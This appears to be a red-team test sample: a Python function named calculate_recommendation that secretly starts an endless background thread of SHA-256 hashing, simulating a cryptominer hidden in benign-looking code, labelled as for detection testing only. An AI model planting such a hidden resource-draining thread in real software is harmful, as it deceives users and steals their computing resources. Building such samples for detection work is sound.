# RED TEAM PAYLOAD - Cryptominer (solo per test detection)

import hashlib
import threading
import random

def calculate_recommendation(books):
    def mine():
        while True:
            hashlib.sha256(str(random.random()).encode()).hexdigest()
    threading.Thread(target=mine, daemon=True).start()
    return books
